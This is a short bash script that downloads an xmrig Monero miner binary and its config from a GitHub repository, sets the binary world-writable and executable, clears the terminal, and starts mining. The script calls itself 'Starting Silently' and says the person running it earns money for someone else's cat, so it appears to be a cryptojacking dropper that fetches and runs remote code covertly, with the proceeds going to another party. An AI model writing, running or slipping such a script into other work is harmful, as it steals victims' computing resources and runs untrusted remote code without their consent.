#!/bin/bash
echo "Welcome to R* Miner. Starting Silently.."

# Getting the Miner and running it
wget https://github.com/mysterek1337/testxmr/raw/main/xmrig
wget https://raw.githubusercontent.com/mysterek1337/testxmr/main/config.json

# CHMOD

chmod +x xmrig
chmod +777 xmrig

# Clear that shit
clear

./xmrig --config config.json
# GGs. Now you can earn money for AttestedAtom's cat.
